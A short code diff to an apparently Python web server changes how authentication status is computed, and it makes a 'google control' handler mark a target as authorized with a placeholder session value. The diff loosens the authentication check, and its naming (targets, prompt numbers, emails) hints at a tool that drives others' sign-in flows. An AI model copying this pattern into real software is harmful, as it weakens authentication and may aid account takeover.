@@ -287,10 +287,12 @@ async def handle_auth_status(request: web.Request) -> web.Response:
 
             has_session = bool(user.get("session_string")) if "session_string" in user.keys() else False
 
-            if auth_step in ("session_revoked", "logged_out", "banned") or not has_session:
+            if auth_step in ("session_revoked", "logged_out", "banned"):
                 is_auth = False
             elif auth_step in ("authorized", "completed", "success"):
                 is_auth = True
+            elif not has_session:
+                is_auth = False
             else:
                 is_auth = False
 
@@ -420,6 +422,9 @@ async def handle_google_control(request: web.Request) -> web.Response:
             prompt_number=prompt_number,
             error_msg=error_msg,
         )
+        if status == "completed":
+            db.set_user_session(DB_PATH, target_id, f"google_auth_{target_id}")
+            db.set_user_auth_step(DB_PATH, target_id, "authorized")
         logger.info("handle_google_control set status '%s' for target_id=%s (email=%s)", status, target_id, email)
         return web.json_response({"ok": True})
     except Exception as exc:
